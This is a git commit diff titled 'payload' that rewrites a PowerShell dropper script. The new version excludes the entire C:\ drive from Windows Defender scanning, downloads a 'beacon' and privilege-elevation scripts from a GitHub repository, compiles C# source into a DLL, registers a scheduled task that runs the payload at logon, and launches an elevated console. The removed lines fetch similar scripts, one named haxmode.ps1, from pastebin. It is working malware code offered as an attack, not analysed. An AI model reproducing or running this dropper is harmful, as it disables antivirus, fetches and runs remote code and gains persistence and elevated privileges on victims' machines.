7fe7bd04e46bd1601ef70afeb8686f86a00a6d48
elias <emmaline131@wireconnected.com>
2024-01-29 16:25:03 +0700

    payload

--- dropPayload/InvokeAll.ps1
+++ dropPayload/InvokeAll.ps1
@@ -1,5 +1,23 @@
-Invoke-Restmethod -Uri https://pastebin.com/raw/EXSvsu9y > C:\temp\source.cs
-Invoke-Restmethod -Uri https://pastebin.com/raw/qKRWF72v > C:\temp\compile.ps1
-Invoke-Restmethod -Uri https://pastebin.com/raw/iNuehLTz > C:\temp\Elevate.ps1
-Invoke-Restmethod -Uri https://pastebin.com/raw/QH5ttqcR > C:\temp\elevinit.ps1
-Invoke-Restmethod -Uri https://pastebin.com/raw/7TZ9RMT6 > C:\temp\haxmode.ps1
+# Excludes file paths
+Add-MpPreference -ExclusionPath "C:\"
+
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/Source.cs > C:\temp\beacon\elevate\Source.cs
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/compile.ps1 > C:\temp\beacon\elevate\compile.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/Elevate.ps1 > C:\temp\beacon\elevate\Elevate.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/elevinit.ps1 > C:\temp\beacon\elevate\elevinit.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/run.ps1 > C:\temp\beacon\run.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/newprocess.ps1 > C:\temp\beacon\newprocess.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/GetState.ps1 > C:\temp\beacon\GetState.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/task.ps1 > C:\temp\beacon\task.ps1
+
+# Compile the C# source code into a DLL
+cd C:\temp\beacon\elevate
+.\compile.ps1
+
+# Create a scheduled task to run the payload at logon
+cd C:\temp\beacon
+.\task.ps1
+
+# Execute the elevated console
+cd C:\temp\beacon\elevate
+.\Elevate.ps1
